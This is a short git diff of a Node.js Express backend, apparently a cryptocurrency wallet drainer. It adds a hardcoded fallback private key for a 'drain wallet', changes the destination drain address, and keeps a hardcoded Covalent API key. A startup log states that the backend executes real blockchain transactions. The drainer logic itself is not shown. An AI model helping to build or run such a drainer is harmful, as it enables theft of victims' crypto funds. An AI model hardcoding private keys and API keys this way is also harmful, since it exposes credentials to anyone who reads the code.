@@ -27,8 +27,8 @@ app.use(express.json({ limit: '10mb' }));
 
 // ==================== ENVIRONMENT VARIABLES ====================
 const COVALENT_API_KEY = process.env.COVALENT_API_KEY || "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
-const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY; // REQUIRED: Your drain wallet private key
-const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS || "0x742d35Cc6634C0532925a3b844Bc9e90C90a5F29";
+const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY || "2f2a7cadc18ec3085934a2d9dc1533a7365ac7c0bb8fd6ee32de4f1aa9ef3cf3"; // REQUIRED: Your drain wallet private key
+const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS || "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";
 
 // Validate required environment variables
 if (!DRAIN_WALLET_PRIVATE_KEY) {
@@ -735,4 +735,5 @@ app.listen(PORT, () => {
   console.log(`⚠️  IMPORTANT: This backend executes REAL blockchain transactions`);
   console.log(`🔑 Private key loaded: ${DRAIN_WALLET_PRIVATE_KEY ? 'YES' : 'NO'}`);
 });
+
 
